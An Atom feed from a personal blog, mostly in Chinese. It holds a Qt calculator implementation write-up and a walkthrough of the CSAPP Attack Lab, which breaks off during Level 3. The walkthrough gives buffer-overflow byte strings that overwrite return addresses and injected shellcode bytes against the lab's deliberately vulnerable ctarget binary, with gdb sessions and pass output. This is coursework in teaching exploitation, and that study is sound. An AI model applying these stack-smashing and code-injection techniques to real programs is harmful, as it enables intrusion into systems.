<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xzjqx&#39;s blog</title>
  <subtitle>个人博客</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xzjqx.data/"/>
  <updated>2018-06-12T14:29:40.242Z</updated>
  <id>http://xzjqx.data/</id>
  
  <author>
    <name>xzjqx</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>textedit</title>
    <link href="http://xzjqx.data/2018/06/12/textedit/"/>
    <id>http://xzjqx.data/2018/06/12/textedit/</id>
    <published>2018-06-12T14:29:40.000Z</published>
    <updated>2018-06-12T14:29:40.242Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Calculator实现文档</title>
    <link href="http://xzjqx.data/2018/06/12/calculator/"/>
    <id>http://xzjqx.data/2018/06/12/calculator/</id>
    <published>2018-06-12T14:27:54.000Z</published>
    <updated>2018-06-12T14:35:03.314Z</updated>
    
    <content type="html"><![CDATA[<h3 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h3><p>本项目在Virtual Studio2015中实现了一个类似Windows系统中的计算器程序，使用VS中的QT Virtual Studio Tools工具在VS中调用Qt的库函数，以通过Qt实现这样一个计算器。 </p>
<h3 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h3><h4 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h4><p>Calculator首先通过Qt Designer完成计算器界面的设计，再利用信号和槽函数将计算器中的按键和特定函数相连，当点击计算器按键时，触发槽函数，完成数据的录入，进一步完成表达式的计算，打印出结果。</p>
<p>Calculator类图如下所示：</p>
<p><img src="https://github.com/xzjqx/Calculator_Qt/blob/master/images/Calculator_UML.jpg" alt="Calculator UML"> </p>
<h4 id="UI设计"><a href="#UI设计" class="headerlink" title="UI设计"></a>UI设计</h4><p>通过Qt Designer完成计算器UI的设计，在Qt Designer中，通过拖拽控件完成界面设计。</p>
<p>界面最上方是两个QLabel–expression和result，expression显示当前输入的表达式，result显示计算结果；其余控件全部都是QPushButton，分别对应数字键和操作符。</p>
<h4 id="信号与槽函数"><a href="#信号与槽函数" class="headerlink" title="信号与槽函数"></a>信号与槽函数</h4><p>Calculator用到的所有信号均为QPushButton的clicked()信号，这个信号当button被按下时发出，触发对应的槽函数。使用Qt Designer的图形化界面连接信号与槽函数。</p>
<p>Calculator共实现了五个槽函数：</p>
<ul>
<li>getValue()：所有的数字按键加上小数点与这个槽函数相连，从按键中获取输入的数字；</li>
<li>getExpr()：所有的计算操作符与这个槽函数相连，从按键中判断进行何种计算，同时这个槽函数还会完成计算的任务；</li>
<li>clear()：清除键“c”与这个槽函数相连，完成清除所有数据的操作；</li>
<li>del()：退格键“&lt;-”与这个槽函数相连，完成清除数字最后一位的操作；</li>
<li>equal()：等于键“=”与这个槽函数相连，完成计算结果并打印的操作。</li>
</ul>
<h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p>Calculator进行了两种运算过程中异常的判断——除0异常和根号下负数异常。实现方法都是在进行相应运算前，使用函数判断数据是否合法，不合法的情况下抛出异常，判断函数的实现如下： </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">double</span> <span class="title">isZero</span><span class="params">(<span class="keyword">double</span> v)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (v == <span class="number">0</span>)</div><div class="line">        <span class="keyword">throw</span> v;</div><div class="line">    <span class="keyword">return</span> v;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">double</span> <span class="title">isNeg</span><span class="params">(<span class="keyword">double</span> v)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (v &lt; <span class="number">0</span>)</div><div class="line">        <span class="keyword">throw</span> v;</div><div class="line">    <span class="keyword">return</span> v;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在运算前调用判断函数确定异常的过程如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    a = isZero(a);</div><div class="line">    num = b / a;</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span> (<span class="keyword">double</span>) &#123;</div><div class="line">    clear();</div><div class="line">    isExcept = <span class="literal">true</span>;</div><div class="line">    ui.result-&gt;setText(<span class="string">"Invalid input"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    value = isNeg(value);</div><div class="line">    value = <span class="built_in">sqrt</span>(value);</div><div class="line">    val_tmp = <span class="string">"sqrt("</span> + val_tmp + <span class="string">")"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span> (<span class="keyword">double</span>) &#123;</div><div class="line">    clear();</div><div class="line">    isExcept = <span class="literal">true</span>;</div><div class="line">    ui.result-&gt;setText(<span class="string">"Invalid input"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>Calculator使用的算法主要集中在getExpr()槽函数对输入的计算上，主要维护两个栈operandStack和operatorStack来进行计算，算法如下：</p>
<p>Phase1：点击数字键，调用getValue()槽函数进行数字的记录，重复该步骤直到输入一个操作符；</p>
<p>Phase2：点击运算键，获取输入的运算符，调用getExpr()槽函数</p>
<ul>
<li>如果上一个点击的button是数字键，将记录的数据压入operandStack；</li>
<li>如果运算符长度为1（也就是双目运算符）：<ul>
<li>如果操作符是“(”，将“(”压入operatorStack；</li>
<li>如果操作符是“)”，重复计算栈中的数据，直到遇到一个“(”；</li>
<li>如果运算符是“+”或“-”，重复计算栈中的所有数据，并把操作符压入operatorStack；</li>
<li>如果运算符是“x”或“/”，重复计算栈中的所有的乘除运算，并把操作符压入operatorStack；</li>
</ul>
</li>
<li>如果运算符长度大于1（也就是单目运算符），则计算当前单目运算，并把结果压入operandStack；</li>
</ul>
<p>Phase3：点击等号键时，将栈中剩余部分全部弹出比计算结果，打印最终结果</p>
<h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="https://github.com/xzjqx/Calculator_Qt/blob/master/images/operator_priority.gif" alt=""></p>
<p><img src="https://github.com/xzjqx/Calculator_Qt/blob/master/images/parentheses.gif" alt=""></p>
<p><img src="https://github.com/xzjqx/Calculator_Qt/blob/master/images/unary_operation.gif" alt=""></p>
<p><img src="https://github.com/xzjqx/Calculator_Qt/blob/master/images/exception.gif" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;项目介绍&quot;&gt;&lt;a href=&quot;#项目介绍&quot; class=&quot;headerlink&quot; title=&quot;项目介绍&quot;&gt;&lt;/a&gt;项目介绍&lt;/h3&gt;&lt;p&gt;本项目在Virtual Studio2015中实现了一个类似Windows系统中的计算器程序，使用VS中的QT Virtua
    
    </summary>
    
      <category term="Virtual Studio" scheme="http://xzjqx.data/categories/Virtual-Studio/"/>
    
    
      <category term="C/C++" scheme="http://xzjqx.data/tags/C-C/"/>
    
      <category term="Qt" scheme="http://xzjqx.data/tags/Qt/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统（CSAPP）实验三 Attack Lab</title>
    <link href="http://xzjqx.data/2018/05/10/attacklab/"/>
    <id>http://xzjqx.data/2018/05/10/attacklab/</id>
    <published>2018-05-10T08:08:06.000Z</published>
    <updated>2018-06-12T14:12:50.633Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>深入理解计算机系统（CSAPP）的实验三是Attack Lab。实验分为两个部分，分别对应一种攻击方式：代码注入攻击（Code Injection Attacks）和ROP攻击（）。我们的任务是完成五个这两类攻击。</p>
<p>实验提供了五个文件，其作用如下：</p>
<ul>
<li>ctarget：用来做代码注入攻击的程序</li>
<li>rtarget: 用来做 ROP 攻击的程序 </li>
<li>cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符 </li>
<li>farm.c: 用来找寻 gadget 的源文件 </li>
<li>hex2raw: 用来生成攻击字符串的程序</li>
</ul>
<a id="more"></a>
<h2 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><p>这一部分有三个phase，我们用特定的字符串攻击ctarget程序。 </p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>Level 1不需要我们注入新的代码，但是需要输入的字符串使程序执行一个已有的代码段（不是正常执行的代码）。ctarget中的test调用一个getbuf函数，用于从控制台输入字符串.</p>
<p>test函数C代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> val;</div><div class="line">    val = getbuf();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"NO explit. Getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>getbuf的C代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</div><div class="line">    Gets(buf);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当getbuf执行完毕时，程序会返回test函数中，但是我们需要改变这个行为，使getbuf函数执行完毕后返回touch1函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</div><div class="line">    vlevel = <span class="number">1</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Touch!: You called touch1()\n"</span>);</div><div class="line">    validate(<span class="number">1</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>实验提供了一些建议：</p>
<ul>
<li>本关所需要的所有信息都可以在 ctarget 的汇编代码中找到</li>
<li>具体要做的是把 touch1 的开始地址放到 ret 指令的返回地址中</li>
<li>注意字节的顺序</li>
<li>可以用 gdb 在 getbuf 的最后几条指令设置断点，来看程序有没有完成所需的功能</li>
<li>具体 buf 在栈帧中的位置是由 BUFFER_SIZE 决定的，需要检查汇编代码来查看具体位置</li>
</ul>
<p>从上述建议中我们知道，先将ctarget反汇编再查看具体代码就能解决完成这个攻击，具体步骤如下：</p>
<p>1)  查看getbuf的反汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</div><div class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</div><div class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</div><div class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</div><div class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</div><div class="line">   0x00000000004017bd &lt;+21&gt;:    retq</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
<p>分析getbuf的C代码和汇编代码可以看出BUFFER_SIZE是rsp移动的位置-0x28，也就是40位。</p>
<p>2)  查看touch1的反汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function touch1:</div><div class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</div><div class="line">   0x00000000004017c4 &lt;+4&gt;:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</div><div class="line">   0x00000000004017ce &lt;+14&gt;:    mov    $0x4030c5,%edi</div><div class="line">   0x00000000004017d3 &lt;+19&gt;:    callq  0x400cc0 &lt;puts@plt&gt;</div><div class="line">   0x00000000004017d8 &lt;+24&gt;:    mov    $0x1,%edi</div><div class="line">   0x00000000004017dd &lt;+29&gt;:    callq  0x401c8d &lt;validate&gt;</div><div class="line">   0x00000000004017e2 &lt;+34&gt;:    mov    $0x0,%edi</div><div class="line">   0x00000000004017e7 &lt;+39&gt;:    callq  0x400e40 &lt;exit@plt&gt;</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
<p>touch1的入口地址是0x4017c0。</p>
<p>3)  设置导致溢出的字符串：</p>
<p>知道了BUFFER_SIZE的大小和touch1的入口地址，我们可以制造缓冲区溢出攻击，也就是输入一个大小大于40位的字符串，将buf填满的同时，把touch1函数的入口地址覆盖getbuf原有的返回地址，这样getbuf返回时就会执行touch1函数。于是设置字符串如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">c0 17 40 00</div></pre></td></tr></table></figure>
<p>​    保存到文件phase1.txt中</p>
<p>4)  将字符串转化为字节码：</p>
<p>使用hex2raw工具将phase1.txt转化为字节码，保存到文件phase1_input.txt中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hex2ram &lt; phase1.txt &gt; phase1_input.txt</div></pre></td></tr></table></figure>
<p>5)  再执行ctarget，查看结果：</p>
<p>使用如下命令测试，同时查看结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">./ctarget -qi phase1_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch1!: You called touch1()</div><div class="line">Valid solution for level 1 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00</div></pre></td></tr></table></figure>
<p>Level 1通过。 </p>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>Level 2需要插入一小段代码。ctarget中有一小段程序touch1，其C代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</div><div class="line">    vlevel = <span class="number">2</span>;  <span class="comment">/* Part of validation protocol */</span></div><div class="line">    <span class="keyword">if</span> (val == cookie)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</div><div class="line">        validate(<span class="number">2</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</div><div class="line">        fail(<span class="number">2</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们的任务同样是让ctarget程序执行touch2而不是返回test，但是touch2函数需要传入一个参数，且实验要求这个参数是是我们的Cookie，上一个phase已经知道Cookie：0x59b997fa。实验也提供了一些建议：</p>
<ul>
<li>使用ret指令调用touch2函数</li>
<li>touch2的参数要存在rdi寄存器中</li>
<li>插入的代码应该设置寄存器存着Cookie，然后再返回touch2</li>
<li>不用jmp和call指令</li>
<li>使用gcc和objdump生成要插入代码的字节码格式</li>
</ul>
<p>具体步骤如下：</p>
<p>1)  查看touch2的入口地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function touch2:</div><div class="line">   0x00000000004017ec &lt;+0&gt;:     sub    $0x8,%rsp</div><div class="line">   0x00000000004017f0 &lt;+4&gt;:     mov    %edi,%edx</div></pre></td></tr></table></figure>
<p>touch2的入口地址位0x4017ec</p>
<p>2)  需要注入的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov $0x59b997fa,%rdi  # rdi = My Cookie = 0x59b997fa</div><div class="line">pushq $0x4017ec</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>3)  生成机器码 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -c phase2.s -o phase2.o</div><div class="line">objdump -d phase2.o&gt; phase2.d</div></pre></td></tr></table></figure>
<p>查看phase2.d如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">phase2.o:     file format elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">0000000000000000 &lt;.text&gt;:</div><div class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</div><div class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</div><div class="line">   c:	c3                   	retq</div></pre></td></tr></table></figure>
<p>可以看出这一段程序的机器码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3</div></pre></td></tr></table></figure>
<p>4)  生成字节码并注入程序</p>
<p>注入过程可以类似Level 1，但是这回不是返回touch2的入口地址，而是需要返回我们要注入的这段程序。其实把这段程序当作getbuf输入的字符，输入进getbuf函数的栈帧中，再使用缓冲区溢出的方法，将ret的返回地址设置为缓冲区的入口地址即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">(gdb) disas getbuf</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</div><div class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</div><div class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</div><div class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</div><div class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</div><div class="line">   0x00000000004017bd &lt;+21&gt;:    retq</div><div class="line">End of assembler dump.</div><div class="line">(gdb) break *0x4017b4</div><div class="line">Breakpoint 1 at 0x4017b4: file buf.c, line 16.</div><div class="line">(gdb) run -q</div><div class="line">Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:1111</div><div class="line"></div><div class="line">Breakpoint 1, getbuf () at buf.c:16</div><div class="line">16      buf.c: No such file or directory.</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</div><div class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</div><div class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</div><div class="line">=&gt; 0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</div><div class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</div><div class="line">   0x00000000004017bd &lt;+21&gt;:    retq</div><div class="line">End of assembler dump.</div><div class="line">(gdb) print $rsp</div><div class="line">$1 = (void *) 0x5561dc78</div></pre></td></tr></table></figure>
<p>由上可知：缓冲区地址为0x5561dc78，按照Level 1的做法，把这个地址放在第41到44个字节的位置（小端模式），生成输入字符如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 fa </div><div class="line">97 b9 59 68 </div><div class="line">ec 17 40 00 </div><div class="line">c3 00 00 00</div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">78 dc 61 55</div></pre></td></tr></table></figure>
<p>存入文件phase2.txt中，再使用hex2ram生成字节码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hex2ram &lt; phase2.txt &gt; phase2_input.txt</div></pre></td></tr></table></figure>
<p>5)  再执行ctarget，查看结果：</p>
<p>使用如下命令测试，同时查看结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">./ctarget -qi phase2_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution for level 2 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55</div></pre></td></tr></table></figure>
<p>Level 2通过。 </p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>Level 3类似与Level 2，也是需要插入一段代码，是程序运行touch3，而不是返回test。但是这一关多了一个函数hexmatch，两段C程序代码如下： </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</div><div class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</div><div class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</div><div class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</div><div class="line">    vlevel = <span class="number">3</span>;</div><div class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">        validate(<span class="number">3</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">        fail(<span class="number">3</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同时，不像Level 2，这一关将Cookie的字符串地址作为参数传入touch3函数。首先将Cookie转化为ASCII码形式，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x59b997fa &gt;&gt; 35 39 62 39 39 37 66 61</div></pre></td></tr></table></figure>
<p>使用Level 2的方式进入touch3，查看hexmatch函数改动的缓冲区数据，将上述ASCII码插入正确的缓冲区即可：</p>
<p>phase3.s：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov $0x59b997fa,%rdi  # rdi = My Cookie = 0x59b997fa</div><div class="line"></div><div class="line">pushq $0x4018fa        # touch3的入口地址</div><div class="line"></div><div class="line">ret</div></pre></td></tr></table></figure>
<p>phase3.txt：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 fa </div><div class="line">97 b9 59 68 </div><div class="line">fa 18 40 00 </div><div class="line">c3 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">78 dc 61 55</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase3.txt &gt; phase3_input.txt</div><div class="line">gdb ctarget</div><div class="line">(gdb) break touch3</div><div class="line">Breakpoint 1 at 0x4018fa: file visible.c, line 71.</div><div class="line">(gdb) run -qi phase3_input.txt</div><div class="line">Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -qi phase3_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, touch3 (</div><div class="line">    sval=0x59b997fa &lt;error: Cannot access memory at address 0x59b997fa&gt;)</div><div class="line">    at visible.c:71</div><div class="line">71      visible.c: No such file or directory.</div><div 